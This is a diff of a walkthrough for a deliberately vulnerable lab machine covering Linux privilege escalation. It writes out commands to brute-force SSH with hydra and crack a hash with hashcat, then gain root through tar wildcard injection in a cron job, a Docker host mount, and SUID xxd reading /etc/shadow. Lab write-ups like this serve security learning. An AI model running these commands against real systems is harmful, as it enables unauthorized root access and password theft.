@@ -162,8 +162,7 @@ Log as captain and you have all control :)
      Passwd: pass123
 
 Voila, we have run all commands.
-The content bellow is not yet finished, i explore all other way.
----
+
 # LinEnum.sh
 
 Download and launch LinEnum.sh:
@@ -173,6 +172,8 @@ Download and launch LinEnum.sh:
     $ sudo sh LinEnum.sh
 
 I've cut some parts:
+
+## Bruteforce with hashcat
 
 ```sh 
 -e [-] Contents of /etc/passwd:
@@ -184,6 +185,8 @@ LinEnum.sh found a hash, we can bruteforce with JohnTheRipper or HashCat (more f
     $ wget -cv https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Leaked-Databases/rockyou-75.txt
     $ hashcat AzER3pBZh6WZE -m 1500 rockyou-75.txt
 
+## Bruteforce SSH 
+
 ```sh
 -e [-] Root is allowed to login via SSH:
 PermitRootLogin yes
@@ -193,6 +196,8 @@ We can bruteforce ssh too with `root`, with a nice dictionnary (there are somes 
 
     $ wget -cv https://github.com/danielmiessler/SecLists/raw/master/Passwords/darkc0de.txt
     $ hydra -t 4 -l root -P darkc0de.txt 192.168.1.14 ssh
+
+## Tar wildcard injection
 
 ```sh
 -e [-] Crontab contents:
@@ -225,17 +230,12 @@ Copy the command under linsecurity:
     $ echo "" > "--checkpoint-action=exec=sh shell.sh"
     $ echo "" > --checkpoint=1
 
-And wait then the cron job start to become root.
+And wait for the cron job start to become root.
 
     id 
     uid=0(root) gid=0(root) groups=0(root)
 
-```sh
--e [-] NFS config details:
-/home/peter *(rw)
--e 
-```
-NFS
+## Docker
 
 ```sh
 -e [+] Looks like we're hosting Docker:
@@ -248,14 +248,28 @@ For docker, we can use [rootplease](https://hub.docker.com/r/chrisfosterelli/roo
     $ git clone https://github.com/chrisfosterelli/dockerrootplease
     $ docker run -v /:/hostOS -i -t dockerrootplease/rootplease
 
-# Peter
+# SUID
 
-We can connect as bob and susan, see if we find peter files:
+A look at [g0tm1lk](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/) to find a command to search suid file:
 
-    $ sudo find / -type f -user peter 2>/dev/null
-    /lib/systemd/system/debug.service
+     $ find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null
+     
+Compare with [gtfobin](https://gtfobins.github.io), theses programs can be exploit:
 
-    $ ls -l /lib/systemd/system/debug.service
-    -rw-r--r-- 1 peter root 205 Jul  9 19:56 /lib/systemd/system/debug.service
+     -rwsr-x--- 1 root itservices 18552 Apr 10  2018 /usr/bin/xxd
+     
+A group itservices... Which user is part of it.
 
-This service is nice to try an privilege escalation.
+    $ grep itservices /etc/group
+    itservices:x:1007:susan
+
+We have found the `.secret` file at top:
+
+    $ su susan
+    Password: MySuperS3cretValue!
+
+We can check the file `/etc/shadow` without the need of sudo:
+
+    $ xxd /etc/shadow | xxd -r
+
+So, this is a nice wm, i probably missed somes part like `NFS`, i am on `gentoo` and i'm lazy about recompile the kernel just for that :)
